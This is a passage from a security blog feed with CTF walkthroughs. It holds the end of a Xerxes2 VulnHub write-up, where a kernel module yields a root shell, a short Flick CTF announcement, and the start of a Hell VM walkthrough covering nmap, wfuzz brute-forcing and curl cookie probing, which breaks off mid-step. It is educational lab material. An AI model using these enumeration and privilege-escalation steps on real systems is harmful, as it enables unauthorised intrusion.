</span><span class='line'><span class="o">[</span>57198.109946<span class="o">]</span> bf<span class="o">[</span>25367<span class="o">]</span>: segfault at 40062000 ip 40062000 sp bfc6282c error 14
</span><span class='line'><span class="o">[</span>68192.983366<span class="o">]</span> hello: module license <span class="s1">&#39;unspecified&#39;</span> taints kernel.
</span><span class='line'><span class="o">[</span>68192.983369<span class="o">]</span> Disabling lock debugging due to kernel taint
</span><span class='line'><span class="o">[</span>68192.983637<span class="o">]</span> Loading hello module...
</span><span class='line'><span class="o">[</span>74155.086393<span class="o">]</span> Loading rooted module...
</span><span class='line'><span class="o">[</span>74155.086397<span class="o">]</span> Call Usermodehelper...
</span><span class='line'><span class="o">[</span>74155.086449<span class="o">]</span> Done usermodehelper...
</span><span class='line'>
</span><span class='line'>korenchkin@xerxes2:~/kern<span class="nv">$ </span><span class="nb">logout</span>
</span><span class='line'>Connection to 192.168.56.102 closed.
</span><span class='line'>
</span><span class='line'>root@kali:~/Desktop/xeres2# ssh root@192.168.56.102 -i delacroix
</span><span class='line'>
</span><span class='line'>Welcome to xerxes2.
</span><span class='line'>      XERXES wishes you
</span><span class='line'>       a pleasant stay.
</span><span class='line'>____   ___  ____  ___  __ ____   ___  ____     ____     ____
</span><span class='line'><span class="sb">`</span>MM<span class="o">(</span>   <span class="o">)</span>P<span class="s1">&#39; 6MMMMb `MM 6MM `MM(   )P&#39;</span> 6MMMMb   6MMMMb<span class="se">\ </span> 6MMMMb
</span><span class='line'> <span class="sb">`</span>MM<span class="sb">`</span> ,P  6M<span class="s1">&#39;  `Mb MM69 &quot;  `MM` ,P  6M&#39;</span>  <span class="sb">`</span>Mb MM<span class="s1">&#39;    ` MM&#39;</span>  <span class="sb">`</span>Mb
</span><span class='line'>  <span class="sb">`</span>MM,P   MM    MM MM<span class="s1">&#39;      `MM,P   MM    MM YM.           ,MM </span>
</span><span class='line'><span class="s1">   `MM.   MMMMMMMM MM        `MM.   MMMMMMMM  YMMMMb      ,MM&#39;</span>
</span><span class='line'>   d<span class="sb">`</span>MM.  MM       MM        d<span class="sb">`</span>MM.  MM            <span class="sb">`</span>Mb   ,M<span class="s1">&#39;    </span>
</span><span class='line'><span class="s1">  d&#39;</span> <span class="sb">`</span>MM. YM    d9 MM       d<span class="s1">&#39; `MM. YM    d9 L    ,MM ,M&#39;</span>
</span><span class='line'>_d_  _<span class="o">)</span>MM_ YMMMM9 _MM_    _d_  _<span class="o">)</span>MM_ YMMMM9  MYMMMM9  MMMMMMMM
</span><span class='line'>
</span><span class='line'>root@xerxes2:~# id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>root@xerxes2:~# cat /root/flag.txt
</span><span class='line'>____   ___  ____  ___  __ ____   ___  ____     ____     ____
</span><span class='line'><span class="sb">`</span>MM<span class="o">(</span>   <span class="o">)</span>P<span class="s1">&#39; 6MMMMb `MM 6MM `MM(   )P&#39;</span> 6MMMMb   6MMMMb<span class="se">\ </span> 6MMMMb
</span><span class='line'> <span class="sb">`</span>MM<span class="sb">`</span> ,P  6M<span class="s1">&#39;  `Mb MM69 &quot;  `MM` ,P  6M&#39;</span>  <span class="sb">`</span>Mb MM<span class="s1">&#39;    ` MM&#39;</span>  <span class="sb">`</span>Mb
</span><span class='line'>  <span class="sb">`</span>MM,P   MM    MM MM<span class="s1">&#39;      `MM,P   MM    MM YM.           ,MM </span>
</span><span class='line'><span class="s1">   `MM.   MMMMMMMM MM        `MM.   MMMMMMMM  YMMMMb      ,MM&#39;</span>
</span><span class='line'>   d<span class="sb">`</span>MM.  MM       MM        d<span class="sb">`</span>MM.  MM            <span class="sb">`</span>Mb   ,M<span class="s1">&#39;    </span>
</span><span class='line'><span class="s1">  d&#39;</span> <span class="sb">`</span>MM. YM    d9 MM       d<span class="s1">&#39; `MM. YM    d9 L    ,MM ,M&#39;</span>
</span><span class='line'>_d_  _<span class="o">)</span>MM_ YMMMM9 _MM_    _d_  _<span class="o">)</span>MM_ YMMMM9  MYMMMM9  MMMMMMMM
</span><span class='line'>
</span><span class='line'>    congratulations on beating xerxes2!
</span><span class='line'>
</span><span class='line'>    I hope you enjoyed it as much as I did making xerxes2.
</span><span class='line'>    xerxes1 has been described as <span class="s1">&#39;weird&#39;</span> and <span class="s1">&#39;left-field&#39;</span>
</span><span class='line'>    and I hope that this one fits that description too :<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>    Many thanks to @TheColonial <span class="p">&amp;</span> @rasta_mouse <span class="k">for </span>testing!
</span><span class='line'>
</span><span class='line'>    Ping me on <span class="c">#vulnhub for thoughts and comments!</span>
</span><span class='line'>
</span><span class='line'>                      @barrebas, July 2014
</span><span class='line'>root@xerxes2:~#
</span></code></pre></td></tr></table></div></figure>


<h2>conclusion</h2>

<p>Xerxes2 really challenged me into learning a ton of new things so this Vulnerable VM was a total win for me! Thanks <a href="https://twitter.com/barrebas">@barrebas</a> and <a href="https://twitter.com/VulnHub">@VulnHub</a> for another great learning opportunity.</p>

<p>Now, the next step? OSCP :)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[flick - can you find the flag?]]></title>
    <link href="http://leonjza.github.io/blog/2014/08/07/flick-can-you-find-the-flag/"/>
    <updated>2014-08-07T12:17:53+02:00</updated>
    <id>http://leonjza.github.io/blog/2014/08/07/flick-can-you-find-the-flag</id>
    <content type="html"><![CDATA[<p><img src="https://i.imgur.com/kxwW1J8.png"></p>

<h3>TL;DR</h3>

<p>I made a CTF! You should try it! Find it <a href="http://vulnhub.com/entry/flick-1,99/">on Vulnhub</a></p>

<h2>foreword</h2>

<p>So, security CTF&rsquo;s are fun. A lot of fun. And can be one heck of a time sink! Checking my laptops time and realizing its 3am on a week night is normal when I get pulled into one. The frustration, the trolls, the tremendous amounts of learning is all part of the experience of a successful CTF in my opinion.</p>

<!--more-->


<h2>preparation</h2>

<p>Having done a few now with varying degrees of success has inspired me to attempt to do the same. So, off I went to CTF island and came back a weekend later with &ldquo;Flick&rdquo;. There is no real meaning to &ldquo;Flick&rdquo;. In fact, the name is the result of: &ldquo;What can I call it?&rdquo; &lt; insert 5u seconds > &ldquo;Flick?&rdquo;.</p>

<h2>details</h2>

<p>&ldquo;Flick&rdquo; aims to give you chance to learn something new. While some things may be trivial for the seasoned penetration tester by day, there may also be one or two things to learn.</p>

<p>As far as hints go, there is not much to give in the beginning. You have to <em>find</em> the flag.txt. It is possible to read it without having root command execution, however, as a added challenge, can you get root command execution? :)</p>

<h2>summary</h2>

<p>I look forward to hearing your experiences with it and good luck! You can find me in #vulnhub on freenode or on twitter @leonjza</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hell would just not freeze over!]]></title>
    <link href="http://leonjza.github.io/blog/2014/07/20/hell-would-just-not-freeze-over/"/>
    <updated>2014-07-20T19:00:46+02:00</updated>
    <id>http://leonjza.github.io/blog/2014/07/20/hell-would-just-not-freeze-over</id>
    <content type="html"><![CDATA[<h2>foreword</h2>

<p>Lets start by saying that this is probably one of the toughest boot2root&rsquo;s I have tried thus far. Even though I have managed to get <code>/root/flag.txt</code>, I am yet to actually <em>root</em> this beast. I believe I have arguably come quite far and there is only one hurdle left, however, almost 3 days later I have learnt a <strong>TON</strong> of stuff, and am satisfied to start jotting the experience down. Obviously, should I finally get <strong>root</strong>, I&rsquo;ll update here and reflect. This is also a relatively long post as there were a ton of things to do. Give yourself some time if you plan on reading the whole post :)</p>

<!--more-->


<h2>welcome to hell</h2>

<p><a href="http://vulnhub.com/entry/hell-1,95/">Hell</a> is another vulnerable VM hosted at <a href="https://twitter.com/vulnhub">@VulnHub</a>. After recently completing the <a href="https://leonjza.github.io/blog/2014/07/17/climbing-the-skytower/">SkyTower</a> Vulnerable VM, I was feeling up to the challenge of a potentially more challenging VM. And boy, was it challenging&hellip; The wife was away on a <em>girls weekend out</em>, so I had plenty of time to sit and really think about things without distractions.</p>

<h2>the usual first steps</h2>

<p>So, like most other CTF type VM&rsquo;s, the natural first approach is to get the VM up and running, get the network connected and fire off a NMAP port scan to see what we got. I decided to use a Kali Linux VM to attack this vulnerableVM. The IP for the Hell VM was 192.168.56.102:</p>

<figure class='code'><figcaption><span>Hell first portscan</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nmap --reason 192.168.56.102
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.46 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-07-20 19:15 SAST
</span><span class='line'>Nmap scan report <span class="k">for </span>192.168.56.102
</span><span class='line'>Host is up, received reset <span class="o">(</span>0.00025s latency<span class="o">)</span>.
</span><span class='line'>Not shown: 996 filtered ports
</span><span class='line'>Reason: 996 no-responses
</span><span class='line'>PORT    STATE SERVICE REASON
</span><span class='line'>22/tcp  open  ssh     syn-ack
</span><span class='line'>80/tcp  open  http    syn-ack
</span><span class='line'>111/tcp open  rpcbind syn-ack
</span><span class='line'>666/tcp open  doom    syn-ack
</span><span class='line'>
</span><span class='line'>Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned in 4.38 seconds
</span></code></pre></td></tr></table></div></figure>


<p>So tcp/22, tcp/80 (kinda expected that), tcp/111 and then the first <em>whaaat</em> moment, tcp/666.</p>

<h2>poking around</h2>

<p>The tcp/666 was the first unusual thing so I decided to check this out first. A telnet to 192.168.56.102 on port 666 resulted in:</p>

<figure class='code'><figcaption><span>&#8216;echoserver&#8217;</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# telnet 192.168.56.102 666
</span><span class='line'>Trying 192.168.56.102...
</span><span class='line'>Connected to 192.168.56.102.
</span><span class='line'>Escape character is <span class="s1">&#39;^]&#39;</span>.
</span><span class='line'>
</span><span class='line'>Welcome to the Admin Panel
</span><span class='line'>Archiving latest version on webserver <span class="o">(</span>echoserver.bak<span class="o">)</span>...
</span><span class='line'>Starting <span class="nb">echo </span>server and monitoring...
</span><span class='line'>ping
</span><span class='line'>ping
</span><span class='line'>pong
</span><span class='line'>pong
</span><span class='line'>^<span class="o">]</span>quit
</span><span class='line'>
</span><span class='line'>telnet&gt; quit
</span><span class='line'>Connection closed.
</span></code></pre></td></tr></table></div></figure>


<p>The line <em>&lsquo;Archiving latest version on webserver (echoserver.bak)&hellip;&rsquo;</em> hints towards the fact that we may be able to get this server software via the webserver. Other than that, the session appears to simply echo whatever I input. I toyed around with random inputs but the echoserver did not appear to be too upset about.</p>

<h2>the echo server</h2>

<p>From the banner received with the service running on tcp/666, I browsed to the webserver root and made a request to <code>echoserver.bak</code>:</p>

<figure class='code'><figcaption><span>echoserver</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# curl  <span class="s2">&quot;http://192.168.56.102/echoserver.bak&quot;</span> &gt; echoserver.bak
</span><span class='line'>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
</span><span class='line'>                                 Dload  Upload   Total   Spent    Left  Speed
</span><span class='line'>100  7846  100  7846    0     0  1290k      0 --:--:-- --:--:-- --:--:-- 1532k
</span><span class='line'>root@kali:~# file echoserver.bak
</span><span class='line'>echoserver.bak: ELF 64-bit LSB executable, x86-64, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked <span class="o">(</span>uses shared libs<span class="o">)</span>, <span class="k">for </span>GNU/Linux 2.6.26, BuildID<span class="o">[</span>sha1<span class="o">]=</span>0xccc6d0e8b14d50e98b07025d5eb9e496a22a8e10, not stripped
</span></code></pre></td></tr></table></div></figure>


<p>Now I will admit, this file kept me busy for a very long time. One would try something, google something, try something, goole something, just to get sucked in and lost in a never ending tunnel of binary exploitation &amp; analysis.
To sum up, one would start the echo server up locally, which opens a socket on tcp/666. I&rsquo;d then telnet to 127.0.0.1:666 and fuzz. Running the echoserver with a <code>strace</code>, one will notice the server &lsquo;dying&rsquo; when a socket is closed:</p>

<figure class='code'><figcaption><span>Echoserver die</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nb">bind</span><span class="o">(</span>3, <span class="o">{</span><span class="nv">sa_family</span><span class="o">=</span>AF_INET, <span class="nv">sin_port</span><span class="o">=</span>htons<span class="o">(</span>666<span class="o">)</span>, <span class="nv">sin_addr</span><span class="o">=</span>inet_addr<span class="o">(</span><span class="s2">&quot;0.0.0.0&quot;</span><span class="o">)}</span>, 16<span class="o">)</span> <span class="o">=</span> 0
</span><span class='line'>listen<span class="o">(</span>3, 10<span class="o">)</span>                           <span class="o">=</span> 0
</span><span class='line'>accept<span class="o">(</span>3, 0, NULL<span class="o">)</span>                      <span class="o">=</span> 4
</span><span class='line'><span class="nb">read</span><span class="o">(</span>4, <span class="s2">&quot;test\r\n&quot;</span>, 2000<span class="o">)</span>               <span class="o">=</span> 6
</span><span class='line'>write<span class="o">(</span>4, <span class="s2">&quot;test\r\n\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&quot;</span>..., 1500<span class="o">)</span> <span class="o">=</span> 1500
</span><span class='line'><span class="nb">read</span><span class="o">(</span>4, <span class="s2">&quot;&quot;</span>, 2000<span class="o">)</span>                       <span class="o">=</span> 0
</span><span class='line'>write<span class="o">(</span>4, <span class="s2">&quot;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&quot;</span>..., 1500<span class="o">)</span> <span class="o">=</span> 1500
</span><span class='line'><span class="nb">read</span><span class="o">(</span>4, <span class="s2">&quot;&quot;</span>, 2000<span class="o">)</span>                       <span class="o">=</span> 0
</span><span class='line'>write<span class="o">(</span>4, <span class="s2">&quot;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&quot;</span>..., 1500<span class="o">)</span> <span class="o">=</span> -1 EPIPE <span class="o">(</span>Broken pipe<span class="o">)</span>
</span><span class='line'>--- SIGPIPE <span class="o">(</span>Broken pipe<span class="o">)</span> @ 0 <span class="o">(</span>0<span class="o">)</span> ---
</span><span class='line'>+++ killed by SIGPIPE +++
</span></code></pre></td></tr></table></div></figure>


<p>Eventually I decided to leave the echoserver alone and move on to the web server.</p>

<h2>the web server</h2>

<p>Web hacking is generally more familiar for me. Initially the web server did not reveal anything interesting. That is until you view the <code>robots.txt</code>:</p>

<figure class='code'><figcaption><span>Hell robots.txt</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# curl http://192.168.56.102/robots.txt
</span><span class='line'>User-agent: *
</span><span class='line'>Disallow: /personal/
</span><span class='line'>Disallow: /super_secret_login_path_muhahaha/
</span></code></pre></td></tr></table></div></figure>


<p>The folder <code>personal/</code> had a g0tmi1lk (founder of VulnHub) fansite detailing that it is being built by Jack and will be live soon. Other than that, nothing particularly interesting. <code>super_secret_login_path_muhahaha</code> however, presented us with a login portal with a title <strong>Admin</strong>.</p>

<p>The login form posted to <code>login.php</code>, and on failure would 302 to: <code>http://192.168.56.102/super_secret_login_path_muhahaha/index.php?the_user_is_a_failure=1</code>. Fuzzing <code>the_user_is_a_failure</code> simply appeared to flip the Login Failed message. Manual and automated test with sqlmap also failed. Sooo, it was time to enumerate some more.</p>

<p>The next move was to fuzz more directories and maybe some interesting files. I decided on <code>wfuzz</code> for this. I used the medium wordlist for the sake of time, and tried for some folders and files in both the known and unknown directories:</p>

<figure class='code'><figcaption><span>Hell web server folders</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/big.txt --hc 404 http://192.168.56.102/super_secret_login_path_muhahaha/FUZZ
</span><span class='line'>
</span><span class='line'>********************************************************
</span><span class='line'>* Wfuzz  2.0 - The Web Bruteforcer                     *
</span><span class='line'>********************************************************
</span><span class='line'>
</span><span class='line'>Target: http://192.168.56.102/super_secret_login_path_muhahaha/FUZZ
</span><span class='line'>Payload <span class="nb">type</span>: file,/usr/share/wordlists/wfuzz/general/big.txt
</span><span class='line'>
</span><span class='line'>Total requests: <span class="nv">3036</span>
</span><span class='line'><span class="o">==================================================================</span>
</span><span class='line'>ID Response   Lines      Word         Chars          <span class="nv">Request</span>
</span><span class='line'><span class="o">==================================================================</span>
</span><span class='line'>
</span><span class='line'>00013:  <span class="nv">C</span><span class="o">=</span>200      7 L        11 W       88 Ch    <span class="s2">&quot; - 1&quot;</span>
</span><span class='line'>02780:  <span class="nv">C</span><span class="o">=</span>200   5606 L     35201 W    1028165 Ch     <span class="s2">&quot; - server&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Adding <code>.php</code> to the end of my fuzz keyword revealed some more interesting files:</p>

<figure class='code'><figcaption><span>Hell web server files</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/big.txt --hc 404 http://192.168.56.102/super_secret_login_path_muhahaha/FUZZ.php
</span><span class='line'>
</span><span class='line'>********************************************************
</span><span class='line'>* Wfuzz  2.0 - The Web Bruteforcer                     *
</span><span class='line'>********************************************************
</span><span class='line'>
</span><span class='line'>Target: http://192.168.56.102/super_secret_login_path_muhahaha/FUZZ.php
</span><span class='line'>Payload <span class="nb">type</span>: file,/usr/share/wordlists/wfuzz/general/big.txt
</span><span class='line'>
</span><span class='line'>Total requests: <span class="nv">3036</span>
</span><span class='line'><span class="o">==================================================================</span>
</span><span class='line'>ID Response   Lines      Word         Chars          <span class="nv">Request</span>
</span><span class='line'><span class="o">==================================================================</span>
</span><span class='line'>
</span><span class='line'>01375:  <span class="nv">C</span><span class="o">=</span>200     17 L        33 W      371 Ch    <span class="s2">&quot; - index&quot;</span>
</span><span class='line'>01663:  <span class="nv">C</span><span class="o">=</span>302      0 L         0 W        0 Ch    <span class="s2">&quot; - login&quot;</span>
</span><span class='line'>01684:  <span class="nv">C</span><span class="o">=</span>200      5 L        19 W      163 Ch    <span class="s2">&quot; - mail&quot;</span>
</span><span class='line'>02009:  <span class="nv">C</span><span class="o">=</span>302     21 L        38 W      566 Ch    <span class="s2">&quot; - panel&quot;</span>
</span><span class='line'>02076:  <span class="nv">C</span><span class="o">=</span>302     17 L        35 W      387 Ch    <span class="s2">&quot; - personal&quot;</span>
</span><span class='line'>02439:  <span class="nv">C</span><span class="o">=</span>200      7 L        21 W      170 Ch    <span class="s2">&quot; - server&quot;</span>
</span><span class='line'>02852:  <span class="nv">C</span><span class="o">=</span>200      2 L         2 W       19 Ch    <span class="s2">&quot; - users&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>So this gives us slightly more to work with. All of the above are relative to <code>super_secret_login_path_muhahaha</code>.
<code>/1</code> was a big red <strong>INTRUDER ALERT</strong> message, and <code>/server</code> was a gif of a server rack falling over.</p>

<p>From the .php file side of things, it was slightly more interesting.</p>

<h2>302 content anyone?</h2>

<p>I was already aware of <code>index.php</code> as well as <code>login.php</code> due to the root of the login directory revealing this. The rest of the items I browsed using the Iceweasal browser in Kali Linux. The results were:</p>

<ul>
<li><code>mail.php</code> was a page showing us that we have received <em>2</em> emails, and that the &lsquo;firewall&rsquo; is activated. There was also what I think is a spam filtering dog gif ;)</li>
<li><code>panel.php</code> simply redirected you back to <code>index.php</code>. Assuming there is a auth requirement here.</li>
<li><code>personal.php</code> also simply redirected you back to <code>index.php</code>. Again, assuming a auth requirement.</li>
<li><code>server.php</code> had the gif we saw in <code>/server</code> with some humorous test with it. Nothing really of interest.</li>
<li><code>users.php</code> just returned the words <em>Jack</em>. This is the same user mentioned in the shrine page from <code>/personal/</code>.</li>
</ul>


<p>Due to these auth requirements, I decided to take all of these url&rsquo;s to <code>curl</code>, and inspect the cookies, headers etc. that were being sent around. Maybe this will hint towards something useful. The command used for the investigations was:</p>

<figure class='code'><figcaption><span>Hell curl</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# curl -L -v http://192.168.56.102/super_secret_login_path_muhahaha/index.php -c cookies -b cookies
</span><span class='line'>&lt;HTML&gt;
</span><span class='line'>&lt;FORM <span class="nv">name</span><span class="o">=</span><span class="s2">&quot;login&quot;</span> <span class="nv">method</span><span class="o">=</span><span class="s2">&quot;post&quot;</span> <span class="nv">action</span><span class="o">=</span><span class="s2">&quot;login.php&quot;</span>&gt;
</span><span class='line'>&lt;CENTER&gt;
</span><span class='line'>&lt;H1&gt; Admin &lt;/H1&gt;
</span><span class='line'>&lt;H3&gt;
</span><span class='line'>&lt;STRONG&gt;Username:&lt;/STRONG&gt;
</span><span class='line'>&lt;INPUT <span class="nv">name</span><span class="o">=</span><span class="s2">&quot;username&quot;</span> <span class="nv">id</span><span class="o">=</span><span class="s2">&quot;username&quot;</span> <span class="nb">type</span><span class="o">=</span><span class="s2">&quot;text&quot;</span> <span class="nv">value</span><span class="o">=</span><span class="s2">&quot;&quot;</span>/&gt;
</span><span class='line'>&lt;BR&gt;
</span><span class='line'>&lt;BR&gt;
</span><span class='line'>&lt;STRONG&gt;Password:&lt;/STRONG&gt;
</span><span class='line'>&lt;INPUT <span class="nv">name</span><span class="o">=</span><span class="s2">&quot;password&quot;</span> <span class="nv">id</span><span class="o">=</span><span class="s2">&quot;password&quot;</span> <span class="nb">type</span><span class="o">=</span><span class="s2">&quot;password&quot;</span> <span class="nv">value</span><span class="o">=</span><span class="s2">&quot;&quot;</span>/&gt;
</span><span class='line'>&lt;BR&gt;
</span><span class='line'>&lt;BR&gt;
</span><span class='line'>&lt;INPUT <span class="nv">name</span><span class="o">=</span><span class="s2">&quot;mysubmit&quot;</span> <span class="nv">id</span><span class="o">=</span><span class="s2">&quot;mysubmit&quot;</span> <span class="nb">type</span><span class="o">=</span><span class="s2">&quot;submit&quot;</span> <span class="nv">value</span><span class="o">=</span><span class="s2">&quot;Login&quot;</span>/&gt;
</span><span class='line'>&lt;/H3&gt;
</span><span class='line'>&lt;/HTML&gt;
</span></code></pre></td></tr></table></div></figure>


<p>Here I am telling curl to make a <code>GET</code> request to <a href="http://192.168.56.102/super_secret_login_path_muhahaha/index.php,">http://192.168.56.102/super_secret_login_path_muhahaha/index.php,</a> using a cookies file called <code>cookies</code> when making the request (-b flag), and storing any cookies received in the same file (-c flag). I am also telling it to follow redirects in the case of <code>302</code>&rsquo;s, and be verbose with output so that I can see the headers. Requesting <code>index.php</code> resulted in a cookie jar of:</p>

<figure class='code'><figcaption><span>Hell cookie-jar</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# cat cookies
</span><span class='line'><span class="c"># Netscape HTTP Cookie File</span>
</span><span class='line'><span class="c"># http://curl.haxx.se/rfc/cookie_spec.html</span>
</span><span class='line'><span class="c"># This file was generated by libcurl! Edit at your own risk.</span>
</span><span class='line'>
</span><span class='line'>192.168.56.102 FALSE /  FALSE 0  PHPSESSID   8u300rbb0747fi6iocm0lt4310
</span></code></pre></td></tr></table></div></figure>


<p>Great. So I used this on all of the enumerated scripts, carefully checking for anything that would stand out. This part definitely took me some time to realize, but I finally saw the gem when I made a request to <code>personal.php</code>:</p>

<figure class='code'><figcaption><span>302 output</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# curl -v -L http://192.168.56.102/super_secret_login_path_muhahaha/personal.php -c cookies -b cookies
</span><span class='line'>* About to connect<span class="o">()</span> to 192.168.56.102 port 80 <span class="o">(</span><span class="c">#0)</span>
</span><span class='line'>*   Trying 192.168.56.102...
</span><span class='line'>* connected
</span><span class='line'>* Connected to 192.168.56.102 <span class="o">(</span>192.168.56.102<span class="o">)</span> port 80 <span class="o">(</span><span class="c">#0)</span>
</span><span class='line'>&gt; GET /super_secret_login_path_muhahaha/personal.php HTTP/1.1
</span><span class='line'>&gt; User-Agent: curl/7.26.0
</span><span class='line'>&gt; Host: 192.168.56.102
</span><span class='line'>&gt; Accept: */*
</span><span class='line'>&gt; Cookie: <span class="nv">PHPSESSID</span><span class="o">=</span>8u300rbb0747fi6iocm0lt4310
</span><span class='line'>&gt;
</span><span class='line'>* HTTP 1.1 or later with persistent connection, pipelining supported
</span><span class='line'>&lt; HTTP/1.1 302 Found
</span><span class='line'>&lt; Date: Sun, 20 Jul 2014 07:48:17 GMT
</span><span class='line'>&lt; Server: Apache/2.2.22 <span class="o">(</span>Debian<span class="o">)</span>
</span><span class='line'>&lt; X-Powered-By: PHP/5.4.4-14+deb7u11
</span><span class='line'>&lt; Expires: Thu, 19 Nov 1981 08:52:00 GMT
</span><span class='line'>&lt; Cache-Control: no-store, no-cache, must-revalidate, post-check<span class="o">=</span>0, pre-check<span class="o">=</span>0
</span><span class='line'>&lt; Pragma: no-cache
</span><span class='line'>&lt; Location: index.php
</span><span class='line'>&lt; Vary: Accept-Encoding
</span><span class='line'>&lt; Content-Length: 387
</span><span class='line'>&lt; Content-Type: text/html
</span><span class='line'>&lt;
</span><span class='line'>* Ignoring the response-body     <span class="c"># WAIT A SEC...</span>
